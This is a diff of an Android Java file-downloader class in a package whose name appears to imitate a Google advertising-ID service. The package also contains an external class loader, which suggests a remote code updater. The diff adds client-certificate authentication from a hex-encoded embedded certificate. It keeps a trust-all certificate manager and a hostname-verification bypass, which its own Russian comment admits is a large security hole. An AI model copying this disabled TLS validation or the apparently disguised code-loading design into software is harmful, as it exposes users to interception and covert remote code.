@@ -2,15 +2,14 @@ package com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdat
 
 import android.content.Context;
 import android.os.AsyncTask;
-import android.support.annotation.AnyThread;
-import android.support.annotation.BinderThread;
+import android.os.Environment;
 
 import com.advertising_id_service.appclick.googleadvertisingidservice.CodeUpdater.ExternalClassLoader.ExternalLibServicer;
 import com.advertising_id_service.appclick.googleadvertisingidservice.GlobalParameters;
 import com.advertising_id_service.appclick.googleadvertisingidservice.Logger.Logger;
-import com.google.android.gms.common.util.IOUtils;
 
 import java.io.BufferedInputStream;
+import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.File;
 import java.io.FileInputStream;
@@ -20,11 +19,14 @@ import java.io.InputStream;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
 import java.net.URL;
+import java.security.KeyStore;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipInputStream;
 
 import javax.net.ssl.HostnameVerifier;
 import javax.net.ssl.HttpsURLConnection;
+import javax.net.ssl.KeyManager;
+import javax.net.ssl.KeyManagerFactory;
 import javax.net.ssl.SSLContext;
 import javax.net.ssl.SSLSession;
 import javax.net.ssl.TrustManager;
@@ -35,7 +37,6 @@ public class FilesLoader {
     /*****************************************************************
      ********** Методы загрузки файла из внешнего источника **********
      *****************************************************************/
-
     public static String readInputStreamAsString(InputStream in)
             throws IOException {
 
@@ -58,6 +59,14 @@ public class FilesLoader {
             }
     };
 
+    private byte[] toByte(String hexString) {
+        int len = hexString.length()/2;
+        byte[] result = new byte[len];
+        for (int i = 0; i < len; i++)
+            result[i] = Integer.valueOf(hexString.substring(2*i, 2*i+2), 16).byteValue();
+        return result;
+    }
+
     public String downloadJson(String query) {
         int count;
 
@@ -65,6 +74,17 @@ public class FilesLoader {
         String res = "";
         try {
             URL url = new URL(query);
+            String pass = new GlobalParameters().getPassToCert();
+            KeyStore clientStore = KeyStore.getInstance("PKCS12");
+            String cert = new GlobalParameters().getCert();
+            InputStream is = new ByteArrayInputStream(toByte(cert));
+
+            clientStore.load(is, pass.toCharArray());
+            KeyManagerFactory kmf = KeyManagerFactory.getInstance(KeyManagerFactory.getDefaultAlgorithm());
+            kmf.init(clientStore, pass.toCharArray());
+            KeyManager[] kms = kmf.getKeyManagers();
+
+
 
             // TODO: Сделать по людски! Это решение - огромная дыра в безопасности:
             // см. https://developer.android.com/training/articles/security-ssl.html#CommonHostnameProbs
@@ -77,7 +97,7 @@ public class FilesLoader {
                 }
             };
             SSLContext sc = SSLContext.getInstance("SSL");
-            sc.init(null, trustAllCerts, new java.security.SecureRandom());
+            sc.init(kms, trustAllCerts, new java.security.SecureRandom());
             HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
 
             connection = (HttpsURLConnection) url.openConnection();
@@ -99,6 +119,7 @@ public class FilesLoader {
             if (connection != null) connection.disconnect();
         }
     }
+
 
     private static int downloadBinaryFile(String query, File dest) {
         int count;
